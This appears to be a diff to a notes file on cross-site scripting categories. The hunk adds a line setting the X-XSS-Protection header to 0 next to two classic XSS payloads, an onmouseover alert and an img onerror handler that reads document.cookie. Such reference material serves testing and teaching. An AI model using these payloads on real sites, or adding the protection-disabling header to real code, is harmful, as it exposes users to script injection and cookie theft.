@@ -18,6 +18,8 @@ Categories:
 * self - user has own xss on own social page or something like that
 
 ````sh
+w.Header().Set("X-XSS-Protection", "0")
+
 <b onmouseover=alert('Wufff!')>click me!</b>
 <img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
 
